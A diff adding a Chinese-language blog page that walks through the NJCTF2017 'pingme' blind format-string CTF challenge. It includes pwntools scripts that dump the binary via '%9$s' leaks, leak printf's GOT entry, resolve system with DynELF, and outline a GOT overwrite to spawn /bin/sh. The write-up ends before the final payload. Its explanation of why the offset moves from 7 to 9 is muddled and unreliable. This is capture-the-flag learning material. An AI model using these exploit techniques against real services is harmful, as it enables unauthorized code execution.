@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="http://localhost:1313//img/cover.jpg">
+    <meta property="twitter:image" content="http://localhost:1313//img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="" />
+    <meta property="og:title" content="" />
+    <meta property="twitter:title" content="" />
+    
+
+    
+    <meta name="description" content="Zephyr&#39;s blog">
+    <meta property="og:description" content="Zephyr&#39;s blog" />
+    <meta property="twitter:description" content="Zephyr&#39;s blog" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, zhaohuabing, Zhaohuabing, , Zephyr的网络日志, Zephyr的博客, Zhaohuabing Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Zephyr的博客 | Zephyr Blog</title>
+
+    <link rel="canonical" href="/post/blindfmt/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ 
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1></h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                    #3
+                             
+                            on 
+                            Monday, January 1, 0001
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="fmt">fmt</h1>
+<h1 id="njctf2017-pingme"><strong>NJCTF2017 pingme</strong></h1>
+<p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0">https://www.bookstack.cn/read/CTF-All-In-One/doc-6.1.2_pwn_njctf2017_pingme.md#题目复现</a></p>
+<h2 id="notebook">notebook</h2>
+<p>fmt_str</p>
+<p>gdb中利用fmtstr xxx查看xxx的偏移量</p>
+<h2 id="题目复现">题目复现</h2>
+<p>在 6.1.1 中我们看到了 blind ROP，这一节中则将看到 blind fmt。它们的共同点是都没有二进制文件，只提供 ip 和端口。</p>
+<p>checksec 如下：</p>
+<pre tabindex="0"><code>$ checksec -f pingmeRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHFORTIFY Fortified Fortifiable  FILENo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No        0               2       pingme
+</code></pre><p>关闭 ASLR，然后把程序运行起来：</p>
+<pre tabindex="0"><code>$ socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp;
+</code></pre><h2 id="blind-fmt-原理及题目解析">Blind fmt 原理及题目解析</h2>
+<p>格式化字符串漏洞我们已经在 3.3.1 中详细讲过了，blind fmt 要求我们在没有二进制文件和 libc.so 的情况下进行漏洞利用，好在程序没有开启任何保护，利用很直接。</p>
+<p>通常有两种方法可以解决这种问题，一种是利用信息泄露把程序从内存中 dump 下来，另一种是使用 pwntools 的 DynELF 模块（关于该模块的使用我们在章节 4.4 中有讲过）。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="确认漏洞">确认漏洞</h3>
+<p>首先你当然不知道这是一个栈溢出还是格式化字符串，栈溢出的话输入一段长字符串，但程序是否崩溃，格式化字符串的话就输入格式字符，看输出。</p>
+<pre tabindex="0"><code>$ nc 127.0.0.1 10001Ping meABCD%7$xABCD44434241
+</code></pre><p>很明显是格式字符串，而且 ABCD 在第 7 个参数的位置，实际上当然不会这么巧，所以需要使用一个脚本去枚举。这里使用 pwntools 的 fmtstr 模块了：</p>
+<pre tabindex="0"><code>def exec_fmt(payload):    p.sendline(payload)    info = p.recv()    return infoauto = FmtStr(exec_fmt)offset = auto.offset
+</code></pre><pre tabindex="0"><code>[*] Found format string offset: 7
+</code></pre><h2 id="dumpfile">dumpfile</h2>
+<p>这是一个32位的程序</p>
+<p>在没有开启 PIE 的情况下，32 位程序从地址 <code>0x8048000</code> 开始，0x1000 的大小就足够了。在对内存 <code>\x00</code> 进行 leak 时，数据长度为零，直接给它赋值就可以了。</p>
+<p>利用fmt将内存中的可执行文件dump下来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>def <span style="color:#50fa7b">dump_memory</span>(start_addr, end_addr)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;&#34;</span>  # 使用字节类型
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> start_addr <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">end_addr</span>:
+</span></span><span style="display:flex;"><span>        p <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remote</span>(&#39;<span style="color:#bd93f9">127.0.0.1</span>&#39;, <span style="color:#bd93f9">10001</span>)
+</span></span><span style="display:flex;"><span>        p.<span style="color:#50fa7b">recvline</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">#print result.encode(&#39;hex&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>        payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;%9$s.AAA&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p32</span>(start_addr)
+</span></span><span style="display:flex;"><span>        p.<span style="color:#50fa7b">sendline</span>(payload)
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> p.<span style="color:#50fa7b">recvuntil</span>(b<span style="color:#f1fa8c">&#34;.AAA&#34;</span>)[<span style="color:#ff79c6">:-</span><span style="color:#bd93f9">4</span>]  # 修改为字节类型
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> data <span style="color:#ff79c6">==</span> b<span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">:</span>  # 修改为字节类型
+</span></span><span style="display:flex;"><span>            data <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>        log.<span style="color:#50fa7b">info</span>(f<span style="color:#f1fa8c">&#34;leaking </span>{start_addr},{data}<span style="color:#f1fa8c">&#34;)</span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">+=</span> data
+</span></span><span style="display:flex;"><span>        start_addr <span style="color:#ff79c6">+=</span> <span style="color:#50fa7b">len</span>(data)
+</span></span><span style="display:flex;"><span>        p.<span style="color:#50fa7b">close</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>start_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8048000</span>
+</span></span><span style="display:flex;"><span>end_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8049000</span>
+</span></span><span style="display:flex;"><span>code_bin <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">dump_memory</span>(start_addr, end_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>with <span style="color:#50fa7b">open</span>(<span style="color:#f1fa8c">&#34;code.bin&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) as <span style="color:#8be9fd;font-style:italic">f</span>:
+</span></span><span style="display:flex;"><span>    f.<span style="color:#50fa7b">write</span>(code_bin)
+</span></span><span style="display:flex;"><span>    f.<span style="color:#50fa7b">close</span>()
+</span></span></code></pre></div><p>在格式化字符串攻击中，偏移量是用来定位参数在堆栈中的位置的。根据你的描述，<strong><code>ABCD%7$x</code></strong> 表示 <strong><code>ABCD</code></strong> 在第 7 个参数的位置。然而，在你的 <strong><code>dump_memory</code></strong> 函数中，构造的 payload 变成了 <strong><code>&quot;%9$s.AAA&quot; + p32(start_addr)</code></strong>，这意味着你要打印的内容 <strong><code>%9$s</code></strong> 被指定为第 9 个参数。</p>
+<p>之所以从 7 改为 9，是因为在新的 payload 中，实际传递给 <strong><code>printf</code></strong> 的参数比原先更多。具体原因如下：</p>
+<ol>
+<li><strong>基础格式化字符串</strong>：
+<ul>
+<li><strong><code>%9$s.AAA</code></strong> 中的 <strong><code>%9$s</code></strong> 是格式化字符串，它指向第 9 个参数。</li>
+</ul>
+</li>
+<li><strong>增加的地址参数</strong>：
+<ul>
+<li><strong><code>p32(start_addr)</code></strong> 是附加到格式化字符串之后的实际地址，这个地址在堆栈中也是一个参数。</li>
+</ul>
+</li>
+</ol>
+<p>当你构造 payload <strong><code>&quot;%9$s.AAA&quot; + p32(start_addr)</code></strong> 时， <strong><code>p32(start_addr)</code></strong> 将地址放在堆栈中一个额外的位置。因此，原来位于第 7 个参数的位置变成了第 9 个参数。</p>
+<h3 id="示例分析"><strong>示例分析</strong></h3>
+<p>假设原来的堆栈情况是这样的：</p>
+<ol>
+<li><strong><code>ABCD</code></strong></li>
+<li>参数1</li>
+<li>参数2</li>
+<li>参数3</li>
+<li>参数4</li>
+<li>参数5</li>
+<li>参数6</li>
+</ol>
+<p><strong><code>%7$s</code></strong> 表示取第 7 个参数。</p>
+<p>当你加入 <strong><code>p32(start_addr)</code></strong> 后，堆栈情况变成：</p>
+<ol>
+<li><strong><code>ABCD</code></strong></li>
+<li>参数1</li>
+<li>参数2</li>
+<li>参数3</li>
+<li>参数4</li>
+<li>参数5</li>
+<li>参数6</li>
+<li><strong><code>start_addr</code></strong> # 这是 p32(start_addr) 加入后的新参数位置</li>
+</ol>
+<p>现在 <strong><code>start_addr</code></strong> 实际上是第 9 个参数，所以你需要用 <strong><code>%9$s</code></strong> 来引用它。</p>
+<p>
+  <img src="./blindfmt.assets/Untitled.png" alt="Untitled">
+
+</p>
+<h3 id="确认新的偏移"><strong>确认新的偏移</strong></h3>
+<p>为了确认新的偏移，我们使用了 <strong><code>FmtStr(exec_fmt)</code></strong> 来自动探测新的偏移量，并发现偏移量是 9。这一步是关键，因为不同的程序可能由于参数传递的变化，导致偏移量有所不同。</p>
+<h2 id="拿到libc">拿到libc</h2>
+<p>利用printf的got泄露</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>def <span style="color:#50fa7b">get_printf_addr</span>()<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    p.<span style="color:#50fa7b">recvline</span>()
+</span></span><span style="display:flex;"><span>    gdb.<span style="color:#50fa7b">attach</span>(p)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;%9$s.AAA&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p32</span>(printf_got)
+</span></span><span style="display:flex;"><span>    p.<span style="color:#50fa7b">sendline</span>(payload)
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">u32</span>(p.<span style="color:#50fa7b">recvuntil</span>(<span style="color:#f1fa8c">&#34;.AAA&#34;</span>)[<span style="color:#ff79c6">:</span><span style="color:#bd93f9">4</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    log.<span style="color:#50fa7b">info</span>(<span style="color:#f1fa8c">&#34;printf address: 0x%x&#34;</span> <span style="color:#ff79c6">%</span> data)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">get_printf_addr</span>()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>$ .<span style="color:#ff79c6">/</span>find printf <span style="color:#bd93f9">670</span>
+</span></span><span style="display:flex;"><span>ubuntu<span style="color:#ff79c6">-</span>xenial<span style="color:#ff79c6">-</span>i386<span style="color:#ff79c6">-</span><span style="color:#50fa7b">libc6</span> (id libc6_2<span style="color:#bd93f9">.23</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0u</span>buntu9_i386)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span>lib32<span style="color:#ff79c6">/</span>libc<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2.26</span>.<span style="color:#50fa7b">so</span> (id local<span style="color:#ff79c6">-</span><span style="color:#bd93f9">292</span>a64d65098446389a47cdacdf5781255a95098)
+</span></span><span style="display:flex;"><span>$ .<span style="color:#ff79c6">/</span>dump local<span style="color:#ff79c6">-</span><span style="color:#bd93f9">292</span>a64d65098446389a47cdacdf5781255a95098 printf system
+</span></span><span style="display:flex;"><span>offset_printf <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00051670</span>
+</span></span><span style="display:flex;"><span>offset_system <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0003cc50</span>
+</span></span></code></pre></div><p>![Untitled](./blindfmt.assets/Untitled 1.png)</p>
+<p>然后弄system,可以看到，我们成功的泄露了printf的函数地址，然后我们利用这个libc-database中搜libc，拿到libc，就可以算出libc-base-addr然后拿到system</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>zephyr@zephyr<span style="color:#ff79c6">-</span>virtual<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">machine</span>:<span style="color:#ff79c6">/</span>mnt<span style="color:#ff79c6">/</span>hgfs<span style="color:#ff79c6">/</span>CTF<span style="color:#ff79c6">/</span>train<span style="color:#ff79c6">/</span>pwn<span style="color:#ff79c6">/</span>CTF<span style="color:#ff79c6">-</span>All<span style="color:#ff79c6">-</span>In<span style="color:#ff79c6">-</span>One<span style="color:#ff79c6">-</span>master<span style="color:#ff79c6">/</span>src<span style="color:#ff79c6">/</span>writeup<span style="color:#ff79c6">/</span><span style="color:#bd93f9">6.1.2</span>_pwn_njctf2017_pingme<span style="color:#ff79c6">/</span>libc<span style="color:#ff79c6">-</span>database$ .<span style="color:#ff79c6">/</span>find printf a90
+</span></span><span style="display:flex;"><span>ubuntu<span style="color:#ff79c6">-</span><span style="color:#50fa7b">glibc</span> (libc6<span style="color:#ff79c6">-</span>amd64_2<span style="color:#bd93f9">.31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0u</span>buntu9<span style="color:#bd93f9">.15</span>_i386)
+</span></span></code></pre></div><h2 id="dynelf">DynELF</h2>
+<p>首先找到程序的入口地址</p>
+<p>![Untitled](./blindfmt.assets/Untitled 2.png)</p>
+<p>如图是 <code>0x8048490</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>def <span style="color:#50fa7b">leak</span>(addr)<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">remote</span>(&#39;<span style="color:#bd93f9">127.0.0.1</span>&#39;, &#39;<span style="color:#bd93f9">10001</span>&#39;)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> b<span style="color:#f1fa8c">&#34;%9$s.AAA&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#50fa7b">p32</span>(addr)
+</span></span><span style="display:flex;"><span>    p.<span style="color:#50fa7b">sendlineafter</span>(b<span style="color:#f1fa8c">&#34;Ping me</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,payload)
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> p.<span style="color:#50fa7b">recvuntil</span>(<span style="color:#f1fa8c">&#34;.AAA&#34;</span>)[<span style="color:#ff79c6">:-</span><span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">+</span> b<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>    log.<span style="color:#50fa7b">info</span>(<span style="color:#f1fa8c">&#34;leaking: 0x%x --&gt; %s&#34;</span> <span style="color:#ff79c6">%</span> (addr, data.<span style="color:#50fa7b">hex</span>()))
+</span></span><span style="display:flex;"><span>    p.<span style="color:#50fa7b">close</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> data
+</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">DynELF</span>(leak, <span style="color:#bd93f9">0x08048490</span>)     # Entry point address
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#ff79c6">=</span> data.<span style="color:#50fa7b">lookup</span>(&#39;system&#39;, &#39;libc&#39;)
+</span></span><span style="display:flex;"><span>printf_addr <span style="color:#ff79c6">=</span> data.<span style="color:#50fa7b">lookup</span>(&#39;printf&#39;, &#39;libc&#39;)
+</span></span><span style="display:flex;"><span>log.<span style="color:#50fa7b">info</span>(<span style="color:#f1fa8c">&#34;system address: 0x%x&#34;</span> <span style="color:#ff79c6">%</span> system_addr)
+</span></span><span style="display:flex;"><span>log.<span style="color:#50fa7b">info</span>(<span style="color:#f1fa8c">&#34;printf address: 0x%x&#34;</span> <span style="color:#ff79c6">%</span> printf_addr)
+</span></span></code></pre></div><h2 id="attack">attack</h2>
+<p>将system的地址写到printf@got中，然后送 <code>/bin/sh</code> 这样就相当于执行了 <code>system(&quot;/bin/sh&quot;</code></p>
+<p>利用 <code>fmtstr_payload</code> 构造payload</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2018/01/02/nginmesh-install/" data-toggle="tooltip" data-placement="top" title="Nginx开源Service Mesh组件Nginmesh安装指南">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/istio" title="istio">
+                            istio
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/nginmesh" title="nginmesh">
+                            nginmesh
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/service-mesh" title="service mesh">
+                            service mesh
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
